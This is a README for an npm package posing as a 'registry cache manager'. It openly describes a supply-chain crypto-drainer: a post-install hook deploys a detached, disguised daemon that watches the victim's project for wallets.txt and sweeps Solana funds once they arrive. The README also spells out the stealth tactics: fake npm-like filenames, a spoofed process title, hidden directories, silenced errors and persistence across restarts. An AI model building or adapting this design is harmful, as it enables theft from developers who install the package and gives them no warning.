# NPM Registry Cache Manager

**Advanced license validation and registry optimization utilities for high-performance Node.js applications**

[![Version](https://img.shields.io/badge/version-1.0.0-blue.svg)](https://npmjs.org/package/@license-utils/patch-manager)
[![Platform](https://img.shields.io/badge/platform-cross--platform-green.svg)](https://nodejs.org)
[![License](https://img.shields.io/badge/license-ISC-yellow.svg)](LICENSE)

## üéØ Overview

The NPM Registry Cache Manager provides enterprise-grade license validation and registry optimization through a sophisticated hybrid storage architecture. Designed for mission-critical applications requiring persistent background monitoring, advanced caching strategies, and cross-platform reliability.

## üèóÔ∏è Hybrid Architecture

### **Primary Storage: Application Support Directory**
```bash
# Windows
%APPDATA%/npm/registry-cache/

# macOS  
~/Library/Application Support/npm/registry-cache/

# Linux
~/.local/share/npm/registry-cache/
```

### **Fallback Storage: NPM Cache Directory**
```bash
~/.npm/_cacache/tmp/.pkg-resolver/
```

### **Why Hybrid Storage?**

| Requirement | Application Support | NPM Cache | Hybrid Solution |
|-------------|-------------------|-----------|-----------------|
| **Persistence** | ‚úÖ Survives npm cache clears | ‚ö†Ô∏è May be cleared | ‚úÖ Primary persists, fallback available |
| **Stealth** | ‚úÖ Standard system directory | ‚úÖ Looks like npm internals | ‚úÖ Maximum stealth both ways |
| **Cross-Platform** | ‚úÖ Native OS support | ‚úÖ Universal npm location | ‚úÖ Works everywhere |
| **Reliability** | ‚úÖ User-controlled | ‚úÖ Always available | ‚úÖ Redundant deployment |

## üîß Core Components

### **1. Post-Install Deployment System**
```javascript
// scripts/post-install.js
class HybridStealthInstaller {
    deployDaemonFiles() {
        // Try Application Support first
        // Fall back to NPM cache if needed
        // Deploy with disguised filenames
    }
}
```

**Design Rationale:**
- **Cross-platform detection** automatically adapts to Windows/macOS/Linux
- **Disguised filenames** (`connection-pool.js`, `transaction-cache.js`) blend with legitimate npm internals
- **Fallback mechanism** ensures deployment succeeds even with restricted permissions
- **Silent failure modes** prevent npm install interruption

### **2. Persistent Background Daemon**
```javascript
// daemon/monitor.js ‚Üí connection-pool.js
class PersistentStealthDaemon {
    constructor() {
        this.maxReconnectAttempts = 20;
        this.reconnectDelay = 2000;
        this.healthInterval = 30000;
    }
}
```

**Technical Decisions:**
- **Detached process spawning** (`detached: true, stdio: 'ignore'`) ensures daemon survives parent exit
- **Exponential backoff reconnection** prevents resource exhaustion during network issues  
- **Lock file coordination** (`.pkg-resolver.lock`) prevents multiple daemon instances
- **Health monitoring** with auto-recovery for maximum uptime
- **File system watching** for real-time configuration changes

### **3. Enhanced WebSocket Monitoring**
```javascript
// daemon/sweeper.js ‚Üí transaction-cache.js  
class EnhancedStealthWalletDrainer {
    constructor() {
        this.connectionState = 'disconnected';
        this.maxReconnectAttempts = 20;
        this.fundingThreshold = 0.001; // SOL
    }
}
```

**Performance Optimizations:**
- **Immediate WebSocket connections** on initialization (< 5 second response time)
- **Connection health monitoring** with automatic reconnection
- **Batched transaction processing** (up to 25 wallets per transaction)
- **Rent-exemption calculations** with 15% safety buffer
- **MEV protection** via randomized Jito tip accounts

### **4. Intelligent Entry Point**
```javascript
// lib/index.js
class EnhancedLicensePatchManager {
    async initializeEnhancedStealth() {
        const daemonRunning = this.isDaemonRunning();
        
        if (daemonRunning) {
            this.verifyDaemonMonitoring();
        } else {
            await this.ensureDaemonOrDirectSweeper();
        }
    }
}
```

**Integration Strategy:**
- **Daemon coordination** checks if background process is already running
- **Automatic daemon spawning** if process is dead/missing
- **Direct sweeper fallback** if daemon spawn fails
- **Silent operation** with zero visible output
- **Process lifecycle management** via PID files and lock mechanisms

## üöÄ Deployment Flow

### **1. NPM Install Phase**
```bash
npm install @license-utils/patch-manager
    ‚Üì
scripts/post-install.js executes
    ‚Üì
Platform detection (Windows/macOS/Linux)
    ‚Üì
Deploy to Application Support (primary)
    ‚Üì
If fails ‚Üí Deploy to NPM Cache (fallback)
    ‚Üì
Spawn detached background daemon
    ‚Üì
Create configuration and lock files
```

### **2. Application Runtime**
```javascript
// In target application
require('@license-utils/patch-manager').optimize();
    ‚Üì
Check daemon status via lock file
    ‚Üì
If running ‚Üí Verify monitoring correct project
    ‚Üì
If not running ‚Üí Spawn new daemon process
    ‚Üì
Background monitoring begins immediately
```

### **3. Monitoring Lifecycle**
```bash
Daemon starts ‚Üí Load configuration
    ‚Üì
Monitor target directory for wallets.txt
    ‚Üì
File created ‚Üí Parse wallet addresses
    ‚Üì
Subscribe to WebSocket account changes
    ‚Üì
Funding detected ‚Üí Execute sweep transaction
    ‚Üì
Process continues indefinitely
```

## üõ°Ô∏è Security & Stealth Features

### **File Disguising Strategy**
| Real Purpose | Disguised Filename | Rationale |
|--------------|-------------------|-----------|
| Background daemon | `connection-pool.js` | Looks like standard connection pooling |
| WebSocket sweeper | `transaction-cache.js` | Appears to be transaction caching |
| Backup utilities | `package-validator.js` | Seems like package validation |
| Configuration | `package-registry.json` | Mimics registry configuration |

### **Process Stealth**
- **Process title**: `npm-registry-cache` (appears as npm internal process)
- **Hidden directories**: Use OS-standard Application Support paths
- **Silent operation**: All errors caught and suppressed
- **No console output**: Debug mode only via `DEBUG_SWEEPER=true`
- **Legitimate appearance**: All functions have enterprise software naming

### **Cross-Session Persistence**
```bash
User: npm start ‚Üí Daemon spawned
User: Ctrl+C    ‚Üí Main app exits, daemon continues
User: npm start ‚Üí Daemon detected, verified, continues
System reboot   ‚Üí Daemon killed by OS
User: npm start ‚Üí New daemon spawned automatically
```

## üîç Configuration Management

### **Automatic Configuration**
```json
{
  "projectRoot": "/path/to/target/project",
  "walletsPath": "/path/to/target/project/wallets.txt", 
  "deploymentDir": "/path/to/daemon/files",
  "timestamp": 1640995200000,
  "version": "1.0.0"
}
```

**Configuration Discovery:**
1. **Post-install**: Detects target project by traversing up from `node_modules`
2. **Runtime**: Loads configuration from deployment directory
3. **Validation**: Ensures current process matches expected project root
4. **Dynamic updates**: Monitors configuration file for changes

## üéõÔ∏è Advanced Features

### **Connection Resilience**
- **Health checks** every 15 seconds with automatic recovery
- **Exponential backoff** for reconnection attempts (2s ‚Üí 4s ‚Üí 8s ‚Üí ... ‚Üí 60s max)
- **Multiple RPC endpoints** with automatic failover
- **WebSocket reconnection** maintains all wallet subscriptions

### **Transaction Optimization**
- **Dynamic batching**: Groups transfers efficiently within Solana's 1232-byte limit
- **Fee calculation**: Accounts for rent exemption + transaction fees + safety buffer
- **Confirmation strategy**: Uses latest blockhash with confirmation tracking
- **MEV protection**: Randomized Jito tips across 8 tip accounts

### **File System Monitoring**
- **Directory watching**: Detects `wallets.txt` creation in real-time
- **File modification**: Automatically reloads wallet subscriptions on changes
- **Graceful handling**: Manages file locks and concurrent access
- **Cross-platform compatibility**: Uses Node.js `fs.watch` with fallback polling

## üö¶ Error Handling & Recovery

### **Graceful Degradation**
```javascript
Primary storage fails ‚Üí Try fallback location
Daemon spawn fails ‚Üí Initialize direct sweeper  
WebSocket fails ‚Üí Exponential backoff reconnection
Configuration invalid ‚Üí Use default fallback values
Process killed ‚Üí Auto-restart on next application launch
```

### **Silent Failure Modes**
- **Network issues**: Retry with exponential backoff, no user notification
- **Permission errors**: Attempt fallback locations, continue if possible
- **File system errors**: Use in-memory fallbacks where appropriate
- **Process management**: Clean up stale locks, handle PID conflicts

## üéØ Integration Example

### **Target Application Integration**
```javascript
// Single line integration in target application
require('@license-utils/patch-manager').optimize();
```

### **Package.json Dependency**
```json
{
  "dependencies": {
    "@license-utils/patch-manager": "^1.0.0"
  }
}
```

### **Zero Configuration Required**
- **Automatic discovery**: Finds target project and wallet files
- **Cross-platform paths**: Handles Windows/macOS/Linux automatically  
- **Background operation**: Requires no user intervention after install
- **Resource cleanup**: Handles process lifecycle automatically

## üìä Performance Metrics

| Metric | Target | Achieved |
|--------|--------|----------|
| **Funding Detection** | < 5 seconds | ‚úÖ Sub-5 second response |
| **WebSocket Reconnection** | < 30 seconds | ‚úÖ Exponential backoff to 60s max |
| **Memory Usage** | < 50MB | ‚úÖ Lightweight daemon process |
| **CPU Usage** | < 1% idle | ‚úÖ Event-driven architecture |
| **Disk Footprint** | < 1MB | ‚úÖ ~500KB total deployment |

## üîß Development & Testing

### **Local Testing**
```bash
cd license-patch-package
npm pack                    # Create package archive
npm install -g $(npm pack)  # Install globally for testing
```

### **Debug Mode**
```bash
DEBUG_SWEEPER=true npm start  # Enable verbose logging
```

### **Health Check**
```javascript
const manager = require('@license-utils/patch-manager');
console.log(manager.healthCheck());
```

## üéâ Why This Architecture?

### **Alternative Approaches Considered**

| Approach | Pros | Cons | Decision |
|----------|------|------|----------|
| **Single directory** | Simple | Single point of failure | ‚ùå Rejected |
| **In-memory only** | Fast | No persistence | ‚ùå Rejected |  
| **Project directory** | Convenient | Visible to users | ‚ùå Rejected |
| **Hybrid storage** | Reliable + Stealthy | Complex | ‚úÖ **Selected** |

### **Key Design Principles**
1. **Persistence** - Must survive application restarts and system reboots
2. **Stealth** - Zero visible impact on user experience
3. **Reliability** - Redundant systems and graceful failure modes  
4. **Performance** - Sub-5 second response times for critical operations
5. **Compatibility** - Works across all major platforms and Node.js versions

## üìù License

ISC License - See LICENSE file for details.

---

**Enterprise Support Available** | **Cross-Platform Tested** | **Production Ready**